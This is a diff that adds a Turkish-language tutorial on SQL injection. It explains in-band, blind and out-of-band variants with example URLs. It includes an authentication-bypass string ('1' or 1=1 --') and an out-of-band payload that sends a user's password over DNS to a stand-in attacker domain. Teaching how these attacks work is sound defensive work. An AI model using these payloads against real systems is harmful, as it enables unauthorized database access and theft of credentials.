@@ -1,0 +1,72 @@
+SQL Injection Nedir?
+
+SQL Injection (SQLi), saldırganın bir web uygulamasının veritabanı sorgularına yetkisiz müdahale etmesine olanak tanıyan bir web güvenlik açığıdır. Bu açık, saldırganın normal şartlarda erişimi olmayan verilere ulaşmasına, bu verileri silmesine veya değiştirmesine imkan tanır. Çoğu durumda bu müdahale, uygulama akışını bozar veya hassas içeriklerin (parolalar, kişisel veriler vb.) ifşasına yol açar.
+
+SQL Injection Neden Türlere Ayrılır?
+
+SQL Injection, uygulamanın mimarisine ve veritabanı yanıtının kullanıcıya nasıl iletildiğine bağlı olarak farklı yöntemlerle sömürülür. Türlerin ayrılma nedeni, her senaryonun farklı bir tepki mekanizmasına sahip olmasıdır.
+
+    Doğrudan Yansıtma: Örneğin, Akdeniz’deki kelebek türlerini listeleyen bir sitede, URL üzerinden manipüle edilen değer doğrudan ekrana basılıyorsa, saldırgan istediği kritik bilgileri kelebek türlerinin yerine görebilir.
+
+    Dolaylı Tepki: Ancak kullanıcıya yansıtılan veri kısıtlıysa (örneğin sadece "Evet/Hayır" veya "Doğru/Yanlış" dönüyorsa), saldırgan ekrana direkt veri yazdıramaz. Bu durumda veriyi tahmin etmek için farklı mantıksal sınamalar (Blind SQLi) kullanması gerekir.
+
+SQL Injection Türleri
+
+https://alpermdr.github.io/assets/images/sqli_types.png
+
+SQL Injection türleri temel olarak üç ana kategoriye ayrılır:
+
+1. In-Band (Klasik) SQL Injection
+
+Saldırganın saldırıyı gerçekleştirmek ve sonuçları toplamak için aynı iletişim kanalını kullandığı türdür. Kendi içinde ikiye ayrılır:
+
+UNION-Based SQLi: UNION operatörü kullanılarak birden fazla sorgunun sonucunun birleştirildiği ve verilerin doğrudan ekrana yazdırıldığı yöntemdir.
+
+        Senaryo: https://kommandant.com/listprojects.php?id=1 adresi arka planda şu sorguyu çalıştırır: SELECT * FROM projects WHERE id = {Girdigimiz_id}
+
+        Saldırgan, kolon sayısını tespit ettikten sonra bir UNION SELECT payload'ı hazırlar. Bu sayede veritabanındaki helper (yardımcı) fonksiyonların sonuçlarını veya tablo içeriklerini direkt ekranda görebilir:
+
+https://alpermdar.github.io/assets/images/acuart_union_based.png
+
+Helper Fonksiyon Örneği: https://alpermdar.github.io/assets/images/acuart_union_based2.png
+
+Error-Based SQLi:
+
+     Bilinçli olarak hatalı SQL sözdizimi (syntax) gönderilerek, veritabanının döndürdüğü hata mesajları içinde verilerin elde edildiği yöntemdir. UNION-Based SQL injection zafiyetine çok benzer.
+
+        https://alpermdr.github.io/assets/images/acuart_error_based.png
+
+2. Inferential (Blind - Kör) SQL Injection
+
+Ekrana doğrudan veri yansıtılmadığı, ancak sistemin davranışlarından çıkarım yapıldığı yöntemdir.
+
+        Boolean-Based SQLi
+
+    Sorgu sonucunun "Doğru" veya "Yanlış" olmasına göre
+    sayfa içeriğinin değiştiği durumlarda kullanılır.
+
+    örnek:
+
+    https://erdalbakal.com/getpassword.php?parola=1' or 1=1 --
+
+    ifadesi tarayıcı üzerinde kullanıldığında,
+    sorgu her zaman "Doğru" döneceği için şifre kontrol aşaması atlanabilir.
+
+            Time-Based SQLi
+
+        Veritabanına sleep() gibi fonksiyonlar gönderilerek,yanıt süresindeki gecikmeye göre verinin doğruluğunun test edildiği yöntemdir.
+        Eğer veritabanı sürümü beklenen değerdeyse,sistem örneğin 5 saniye geç cevap verir ve saldırgan bu gecikmeden çıkarım yapar.
+
+        Örnek:
+        https://alpermdr.github.io/assets/images/time_based.png
+
+3. Out-Of-Band SQL Injection
+
+Saldırganın, veritabanı sunucusunun ağın dışındaki başka bir sunucuya (kendi kontrolündeki bir DNS veya HTTP sunucusu) istek atmasını sağlayarak veriyi elde ettiği yöntemdir.
+
+    Örnek Payload: ' LOAD_FILE(CONCAT('\\\\', (SELECT password FROM users WHERE id=1), '.saldirgan.com\\a'))
+
+        Bu komut sonucunda, ID'si 1 olan kullanıcının parolası bir DNS sorgusu olarak saldırganın sunucusuna ulaşır.
+
+
+
